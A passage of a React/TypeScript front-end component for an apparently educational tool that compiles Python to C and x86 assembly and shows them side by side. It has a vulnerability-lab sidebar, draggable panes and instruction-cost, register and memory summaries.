            pyghidra  = Nuitka→native→Ghidra (heavy, no line trace).         */}
        <label
          title="Compile backend"
          style={{
            display: 'flex',
            alignItems: 'center',
            gap: 6,
            fontSize: 10,
            color: 'var(--text-dim)',
            fontFamily: 'Fira Code, monospace',
            letterSpacing: '0.08em',
          }}
        >
          <span>METHOD::</span>
          <select
            value={method}
            onChange={e => setMethod(e.target.value as CompileMethod)}
            disabled={loading}
            style={{
              background: 'var(--bg-base)',
              color: method === 'pyghidra' ? 'var(--cyan)' : 'var(--green)',
              border: `1px solid ${method === 'pyghidra' ? 'var(--cyan)' : 'var(--green)'}44`,
              padding: '3px 6px',
              fontSize: 11,
              fontFamily: 'Fira Code, monospace',
              letterSpacing: '0.06em',
              borderRadius: 2,
              cursor: loading ? 'not-allowed' : 'pointer',
            }}
          >
            <option value="transpile">TRANSPILE → GCC</option>
            <option value="pyghidra">NUITKA → PYGHIDRA</option>
          </select>
        </label>

        <button
          onClick={handleCompile}
          disabled={loading}
          style={{
            background: loading ? 'transparent' : 'var(--green-faint)',
            color: loading ? 'var(--text-dim)' : 'var(--green)',
            border: `1px solid ${loading ? 'var(--border-dim)' : 'var(--green)'}`,
            padding: '6px 18px',
            fontSize: 12,
            letterSpacing: '0.1em',
            boxShadow: loading ? 'none' : 'var(--glow-green)',
          }}
        >
          {loading ? '[ COMPILING… ]' : '[> COMPILE ]'}
        </button>
      </div>

      {/* ── Error bar ── */}
      {error && (
        <div style={{
          background: '#1a0008',
          color: 'var(--red)',
          padding: '6px 20px',
          fontSize: 12,
          fontFamily: 'Fira Code, monospace',
          borderBottom: '1px solid var(--red)',
          boxShadow: 'var(--glow-red)',
          letterSpacing: '0.04em',
          flexShrink: 0,
        }}>
          [!] ERR :: {error}
        </div>
      )}

      {/* ── Body: sidebar + panes ── */}
      <div style={{ display: 'flex', flex: 1, overflow: 'hidden' }}>

        {/* ── Vuln sidebar ── */}
        <div style={{
          width: sidebarOpen ? 262 : 28,
          flexShrink: 0,
          display: 'flex',
          flexDirection: 'column',
          background: 'var(--bg-header)',
          borderRight: '1px solid var(--border-mid)',
          transition: 'width 0.18s ease',
          overflow: 'hidden',
          position: 'relative',
        }}>
          {/* Sidebar header row */}
          <div style={{
            display: 'flex',
            alignItems: 'center',
            padding: '7px 8px',
            borderBottom: '1px solid var(--border-dim)',
            gap: 6,
            flexShrink: 0,
          }}>
            {sidebarOpen && (
              <span style={{
                fontWeight: 700,
                fontSize: 11,
                color: 'var(--red)',
                letterSpacing: '0.14em',
                fontFamily: 'Fira Code, monospace',
                whiteSpace: 'nowrap',
                flex: 1,
              }}>
                &gt;_ VULN//LAB
              </span>
            )}
            <button
              onClick={() => setSidebarOpen(o => !o)}
              title={sidebarOpen ? 'Collapse sidebar' : 'Expand sidebar'}
              style={{
                padding: '2px 6px',
                fontSize: 11,
                color: 'var(--text-dim)',
                border: '1px solid var(--border-dim)',
                flexShrink: 0,
              }}
            >
              {sidebarOpen ? '◀' : '▶'}
            </button>
          </div>

          {/* Vuln card list */}
          {sidebarOpen && (
            <div style={{ overflowY: 'auto', flex: 1, padding: '6px 6px' }}>
              {displayedVulns.map(v => {
                const isActive = activeVuln?.id === v.id
                const sevColor = SEVERITY_COLOR[v.severity]
                return (
                  <button
                    key={v.id}
                    onClick={() => selectVuln(v)}
                    title={v.description}
                    style={{
                      display: 'block',
                      width: '100%',
                      textAlign: 'left',
                      background: isActive ? `${sevColor}14` : 'transparent',
                      border: `1px solid ${isActive ? sevColor : 'var(--border-dim)'}`,
                      borderRadius: 2,
                      padding: '7px 8px',
                      marginBottom: 5,
                      cursor: 'pointer',
                      boxShadow: isActive ? `0 0 8px ${sevColor}33` : 'none',
                      transition: 'all 0.12s',
                    }}
                  >
                    {/* Vuln name + severity badge */}
                    <div style={{ display: 'flex', alignItems: 'center', gap: 5, marginBottom: 3 }}>
                      <span style={{
                        fontSize: 10,
                        fontWeight: 700,
                        color: isActive ? sevColor : 'var(--text-primary)',
                        fontFamily: 'Fira Code, monospace',
                        letterSpacing: '0.06em',
                        flex: 1,
                        lineHeight: 1.2,
                      }}>
                        {v.name}
                      </span>
                      <span style={{
                        fontSize: 8,
                        fontWeight: 700,
                        color: sevColor,
                        border: `1px solid ${sevColor}`,
                        borderRadius: 2,
                        padding: '1px 4px',
                        fontFamily: 'Fira Code, monospace',
                        letterSpacing: '0.06em',
                        flexShrink: 0,
                      }}>
                        {v.severity}
                      </span>
                    </div>
                    {/* Category + description */}
                    <div style={{
                      fontSize: 9,
                      color: 'var(--text-dim)',
                      fontFamily: 'Fira Code, monospace',
                      letterSpacing: '0.04em',
                      marginBottom: 2,
                    }}>
                      [{v.category}]
                    </div>
                    <div style={{
                      fontSize: 9,
                      color: isActive ? 'var(--text-dim)' : 'var(--text-muted)',
                      fontFamily: 'Fira Code, monospace',
                      lineHeight: 1.4,
                      whiteSpace: 'normal',
                    }}>
                      {v.description}
                    </div>
                  </button>
                )
              })}
            </div>
          )}
        </div>

        {/* ── Three-pane workspace ── */}
        <div style={{ display: 'flex', flexDirection: 'column', flex: 1, overflow: 'hidden', padding: 6, gap: 0 }}>

          {/* Restore bar — shown when panes are closed */}
          {closedPanes.size > 0 && (
            <div style={{ display: 'flex', gap: 4, marginBottom: 6, flexShrink: 0, flexWrap: 'wrap' }}>
              {paneOrder.filter(p => closedPanes.has(p)).map(p => {
                const label: Record<string, string> = { python: 'PYTHON', c: 'C', asm: 'x86 ASM' }
                return (
                  <button
                    key={p}
                    onClick={() => openPane(p)}
                    style={{
                      fontSize: 10,
                      color: 'var(--cyan)',
                      border: '1px solid var(--cyan)44',
                      background: '#00ccff0d',
                      borderRadius: 2,
                      padding: '3px 10px',
                      letterSpacing: '0.1em',
                      fontFamily: 'Fira Code, monospace',
                      boxShadow: '0 0 4px #00ccff22',
                    }}
                  >
                    [+] {label[p] ?? p.toUpperCase()}
                  </button>
                )
              })}
            </div>
          )}

          {/* Panes row */}
          <div style={{ display: 'flex', flex: 1, overflow: 'hidden', gap: 6 }}>
            {(() => {
              const visible = paneOrder.filter(p => !closedPanes.has(p))
              return visible.map((pane, idx) => {
                const canLeft  = idx > 0
                const canRight = idx < visible.length - 1
                return (
                <div
                  key={pane}
                  onDragOver={e => handlePaneDragOver(pane, e)}
                  onDrop={e => handlePaneDrop(pane, e)}
                  onDragLeave={e => { if (!e.currentTarget.contains(e.relatedTarget as Node)) setDragOver(null) }}
                  onDragEnd={() => { dragSrc.current = null; setDragOver(null) }}
                  style={{
                    flex: 1,
                    minWidth: 0,
                    display: 'flex',
                    flexDirection: 'column',
                    borderRadius: 2,
                    outline: dragOver === pane ? '2px dashed #00ccff88' : '2px dashed transparent',
                    transition: 'outline-color 0.12s',
                  }}
                >
                  {/* Python editor */}
                  {pane === 'python' && (
                    <div style={{
                      display: 'flex',
                      flexDirection: 'column',
                      flex: 1,
                      background: 'var(--bg-panel)',
                      borderRadius: 2,
                      overflow: 'hidden',
                      border: activeVuln
                        ? `1px solid ${SEVERITY_COLOR[activeVuln.severity]}55`
                        : '1px solid var(--border-dim)',
                      boxShadow: activeVuln
                        ? `0 0 12px ${SEVERITY_COLOR[activeVuln.severity]}22`
                        : 'none',
                    }}>
                      <PaneHeader
                        title="PYTHON"
                        badge={activeVuln ? activeVuln.name : 'INPUT'}
                        badgeColor={activeVuln ? SEVERITY_COLOR[activeVuln.severity] : 'var(--green)'}
                        onClose={() => closePane('python')}
                        onDragStart={e => handlePaneDragStart('python', e)}
                        onMoveLeft={canLeft ? () => movePane('python', -1) : undefined}
                        onMoveRight={canRight ? () => movePane('python', 1) : undefined}
                      />
                      <div
                        style={{ flex: 1, overflow: 'auto', cursor: result ? 'pointer' : 'text' }}
                        onClick={handlePythonLineClick}
                      >
                        <CodeMirror
                          value={code}
                          onChange={handleCodeChange}
                          extensions={[python()]}
                          theme={oneDark}
                          style={{ height: '100%', fontSize: 13 }}
                          basicSetup={{ lineNumbers: true, foldGutter: false }}
                          onCreateEditor={(view) => { editorViewRef.current = view }}
                        />
                      </div>
                    </div>
                  )}

                  {/* C output — badge reflects the backend that produced it */}
                  {pane === 'c' && (result ? (
                    <CodePane
                      title="C"
                      badge={method === 'pyghidra' ? 'GHIDRA DECOMP' : 'TRANSPILED'}
                      lines={result.c_lines}
                      highlightMap={cHighlight}
                      activeLines={activeCLines}
                      onClose={() => closePane('c')}
                      onDragStart={e => handlePaneDragStart('c', e)}
                      onMoveLeft={canLeft ? () => movePane('c', -1) : undefined}
                      onMoveRight={canRight ? () => movePane('c', 1) : undefined}
                    />
                  ) : (
                    <PlaceholderPane
                      title="C"
                      badge={method === 'pyghidra' ? 'GHIDRA DECOMP' : 'TRANSPILED'}
                      onClose={() => closePane('c')}
                      onDragStart={e => handlePaneDragStart('c', e)}
                      onMoveLeft={canLeft ? () => movePane('c', -1) : undefined}
                      onMoveRight={canRight ? () => movePane('c', 1) : undefined}
                    />
                  ))}

                  {/* Assembly output */}
                  {pane === 'asm' && (result ? (
                    <AsmPane
                      title="x86 ASM"
                      badge={method === 'pyghidra' ? 'NUITKA + GHIDRA' : 'GCC -O0'}
                      lines={result.asm_lines}
                      highlightMap={asmHighlight}
                      activeLines={activeAsmLines}
                      infoMap={asmToInfo}
                      vuln={activeVuln ? {
                        name: activeVuln.name,
                        severity: activeVuln.severity,
                        explanation: activeVuln.explanation,
                        badPatterns: activeVuln.badAsm.patterns,
                        badDescription: activeVuln.badAsm.description,
                      } : null}
                      onClose={() => closePane('asm')}
                      onDragStart={e => handlePaneDragStart('asm', e)}
                      onMoveLeft={canLeft ? () => movePane('asm', -1) : undefined}
                      onMoveRight={canRight ? () => movePane('asm', 1) : undefined}
                    />
                  ) : (
                    <PlaceholderPane
                      title="x86 ASM"
                      badge={method === 'pyghidra' ? 'NUITKA + GHIDRA' : 'GCC -O0'}
                      onClose={() => closePane('asm')}
                      onDragStart={e => handlePaneDragStart('asm', e)}
                      onMoveLeft={canLeft ? () => movePane('asm', -1) : undefined}
                      onMoveRight={canRight ? () => movePane('asm', 1) : undefined}
                    />
                  ))}
                </div>
              )})
            })()}
          </div>
        </div>
      </div>

      {/* ── Legend / status bar ── */}
      {result && (
        <div style={{
          display: 'flex',
          flexWrap: 'wrap',
          alignItems: 'center',
          gap: 4,
          padding: '5px 10px',
          background: 'var(--bg-header)',
          borderTop: '1px solid var(--border-mid)',
          minHeight: 34,
          flexShrink: 0,
        }}>
          <span style={{
            fontSize: 9,
            color: 'var(--text-dim)',
            letterSpacing: '0.12em',
            marginRight: 6,
            whiteSpace: 'nowrap',
          }}>
            TRACE::
          </span>
          {result.cost_summary && (
            <span
              title="Total x86 instructions emitted by this program. Higher = more work at the CPU level."
              style={{
                fontSize: 9,
                fontWeight: 700,
                color: 'var(--cyan)',
                background: 'var(--cyan-dim)',
                border: '1px solid var(--cyan)',
                borderRadius: 2,
                padding: '0 6px',
                letterSpacing: '0.08em',
                marginRight: 6,
                whiteSpace: 'nowrap',
                fontFamily: 'Fira Code, monospace',
              }}
            >
              COST:: {result.cost_summary.total_instructions} INSTR
            </span>
          )}
          {result.cost_summary?.category_totals && formatMix(result.cost_summary.category_totals) && (
            <span
              title={`Instruction mix — how the program's x86 splits across categories: ${formatMix(result.cost_summary.category_totals)}. At -O0, a high 'memory' share reflects stack spilling.`}
              style={{
                fontSize: 9,
                fontWeight: 700,
                color: 'var(--text-muted)',
                border: '1px solid var(--border-mid)',
                borderRadius: 2,
                padding: '0 6px',
                letterSpacing: '0.08em',
                marginRight: 6,
                whiteSpace: 'nowrap',
                fontFamily: 'Fira Code, monospace',
              }}
            >
              MIX:: {formatMix(result.cost_summary.category_totals)}
            </span>
          )}
          {result.register_summary?.register_totals && formatRegisterTotals(result.register_summary.register_totals) && (
            <span
              title={`Register footprint — how many instructions touch each x86 register: ${formatRegisterTotals(result.register_summary.register_totals)}. Integer division implicitly uses the %edx:%eax pair, so %edx can appear even when your code never names it.`}
              style={{
                fontSize: 9,
                fontWeight: 700,
                color: 'var(--text-muted)',
                border: '1px solid var(--border-mid)',
                borderRadius: 2,
                padding: '0 6px',
                letterSpacing: '0.08em',
                marginRight: 6,
                whiteSpace: 'nowrap',
                fontFamily: 'Fira Code, monospace',
                cursor: 'help',
              }}
            >
              REGS:: {formatRegisterTotals(result.register_summary.register_totals)}
            </span>
          )}
          {result.memory_summary?.memory_totals && formatMemory(result.memory_summary.memory_totals) && (
            <span
              title={`Memory traffic — total memory reads (loads) and writes (stores): ${formatMemory(result.memory_summary.memory_totals)}. At -O0 every variable lives on the stack, so even 'x += 1' is a load → compute → store round-trip. High load/store counts are pure stack shuffling an optimising build would keep in registers instead.`}
              style={{
                fontSize: 9,
                fontWeight: 700,
                color: 'var(--text-muted)',
                border: '1px solid var(--border-mid)',
                borderRadius: 2,
                padding: '0 6px',
                letterSpacing: '0.08em',
                marginRight: 6,
                whiteSpace: 'nowrap',
                fontFamily: 'Fira Code, monospace',
                cursor: 'help',
              }}
            >
              MEM:: {formatMemory(result.memory_summary.memory_totals)}
            </span>
          )}
          {result.asm_glossary && result.asm_glossary.length > 0 && (
            <span
              title={`Instruction glossary — what each distinct x86 mnemonic in the ASM pane means:\n\n${formatGlossary(result.asm_glossary)}`}
              style={{
                fontSize: 9,
                fontWeight: 700,
                color: 'var(--text-muted)',
                border: '1px solid var(--border-mid)',
                borderRadius: 2,
                padding: '0 6px',
                letterSpacing: '0.08em',
                marginRight: 6,
                whiteSpace: 'nowrap',
                fontFamily: 'Fira Code, monospace',
                cursor: 'help',
              }}
            >
              GLOSSARY:: {result.asm_glossary.length} OPS
            </span>
          )}
          {result.python_lines.map((line, i) => {
            const pyLine = i + 1
            const mapping = result.line_map[pyLine] as LineMapping | undefined
            if (!mapping) return null
            const isActive = activePyLine === pyLine
            const flags = mapping.flags ?? []
            const count = mapping.asm_count ?? 0
            const flagTitle = flags.length
              ? ` — expensive: ${flags.map(f => FLAG_LABEL[f] ?? f).join(', ')}`
              : ''
            const mixTitle = formatMix(mapping.category_counts)
              ? ` — mix: ${formatMix(mapping.category_counts)}`
              : ''
            const regs = mapping.registers ?? []
            const regsTitle = regs.length
              ? ` — regs: ${regs.map(r => `%${r}`).join(', ')}`
              : ''
            const memTitle = formatMemory(mapping.memory_counts)
              ? ` — mem: ${formatMemory(mapping.memory_counts)}`
              : ''
            return (
              <button
                key={pyLine}
                onClick={() => setActivePyLine(isActive ? null : pyLine)}
                style={{
                  background: isActive ? `${mapping.color}22` : 'transparent',
                  color: isActive ? mapping.color : `${mapping.color}99`,
                  border: `1px solid ${isActive ? mapping.color : `${mapping.color}44`}`,
                  borderRadius: 2,
                  padding: '1px 8px',
                  fontSize: 10,
                  fontFamily: 'Fira Code, monospace',
                  maxWidth: 220,
                  overflow: 'hidden',
                  textOverflow: 'ellipsis',
                  whiteSpace: 'nowrap',
                  letterSpacing: '0.04em',
                  boxShadow: isActive ? `0 0 6px ${mapping.color}55` : 'none',
                  transition: 'all 0.1s',
                }}
                title={`Line ${pyLine}: ${line} — ${count} asm instr${mixTitle}${regsTitle}${memTitle}${flagTitle}`}
              >
                L{pyLine}: {line.trim().slice(0, 24)}{line.trim().length > 24 ? '…' : ''}
                {count > 0 && (
                  <span style={{ color: 'var(--text-muted)', marginLeft: 5 }}>·{count}</span>
                )}
                {flags.map(f => (
                  <span
                    key={f}
                    style={{ color: 'var(--red)', marginLeft: 3, fontWeight: 700 }}
                  >
                    {FLAG_MARKER[f] ?? '!'}
                  </span>
                ))}
              </button>
            )
          })}
        </div>
      )}
    </div>
  )
}

// ─── Shared sub-components ─────────────────────────────────────────────────

function PaneHeader({
  title, badge, badgeColor, onClose, onDragStart, onMoveLeft, onMoveRight,
}: {
  title: string; badge?: string; badgeColor?: string;
  onClose?: () => void; onDragStart?: (e: React.DragEvent) => void;
  onMoveLeft?: () => void; onMoveRight?: () => void;
}) {
  return (
    <div style={{
      padding: '7px 10px',
      background: 'var(--bg-header)',
      borderBottom: '1px solid var(--border-dim)',
      display: 'flex',
      alignItems: 'center',
      gap: 6,
      flexShrink: 0,
    }}>
      <span
        draggable={!!onDragStart}
        onDragStart={onDragStart}
        title="Drag to reorder"
        style={{
          cursor: onDragStart ? 'grab' : 'default',
          color: 'var(--border-bright)',
          fontSize: 13,
          userSelect: 'none',
          flexShrink: 0,
          letterSpacing: '-1px',
        }}
      >⠿</span>
      <span style={{
        fontWeight: 700,
        fontSize: 11,
        color: 'var(--text-dim)',
        textTransform: 'uppercase',
        letterSpacing: '0.14em',
        fontFamily: 'Fira Code, monospace',
      }}>
        &gt;_ {title}
      </span>
      {badge && (
        <span style={{
          background: `${badgeColor ?? 'var(--cyan)'}18`,
          color: badgeColor ?? 'var(--cyan)',
          border: `1px solid ${badgeColor ?? 'var(--cyan)'}44`,
          borderRadius: 2,
          padding: '0 6px',
          fontSize: 9,
          fontWeight: 700,
          letterSpacing: '0.1em',
          fontFamily: 'Fira Code, monospace',
        }}>
          {badge}
        </span>
      )}
      <span style={{ flex: 1 }} />
      {onMoveLeft && (
        <button onClick={onMoveLeft} title="Move pane left" style={CTRL_BTN_STYLE}>◀</button>
      )}
      {onMoveRight && (
        <button onClick={onMoveRight} title="Move pane right" style={CTRL_BTN_STYLE}>▶</button>
      )}
      {onClose && (
        <button onClick={onClose} title="Close pane" style={CTRL_BTN_STYLE}>×</button>
      )}
    </div>
  )
}

const CTRL_BTN_STYLE: React.CSSProperties = {
  padding: '1px 5px',
  fontSize: 10,
  color: 'var(--text-muted)',
  border: '1px solid var(--border-dim)',
  borderRadius: 2,
  lineHeight: 1,
  flexShrink: 0,
}

function PlaceholderPane({
  title, badge, onClose, onDragStart, onMoveLeft, onMoveRight,
}: {
  title: string; badge?: string;
  onClose?: () => void; onDragStart?: (e: React.DragEvent) => void;
  onMoveLeft?: () => void; onMoveRight?: () => void;
}) {
  return (
    <div style={{
      flex: 1,
      minWidth: 0,
      background: 'var(--bg-panel)',
      borderRadius: 2,
      border: '1px solid var(--border-dim)',
      display: 'flex',
      flexDirection: 'column',
    }}>
      <PaneHeader title={title} badge={badge} onClose={onClose} onDragStart={onDragStart} onMoveLeft={onMoveLeft} onMoveRight={onMoveRight} />
      <div style={{
        flex: 1,
        display: 'flex',
        flexDirection: 'column',
        alignItems: 'center',
        justifyContent: 'center',
        gap: 8,
        color: 'var(--text-muted)',
        fontFamily: 'Fira Code, monospace',
        fontSize: 12,
      }}>
        <pre style={{ color: 'var(--border-bright)', lineHeight: '1.4', fontSize: 11, margin: 0 }}>{
`┌─────────────────┐
│  AWAITING INPUT │
└─────────────────┘`
        }</pre>
        <span style={{ fontSize: 10, letterSpacing: '0.1em', color: 'var(--text-dim)' }}>
          PRESS <span style={{ color: 'var(--green)' }}>[&gt; COMPILE]</span> TO BEGIN
        </span>
        <span className="cursor-blink" style={{ color: 'var(--green)', fontSize: 16 }}>█</span>
      </div>
    </div>
  )
}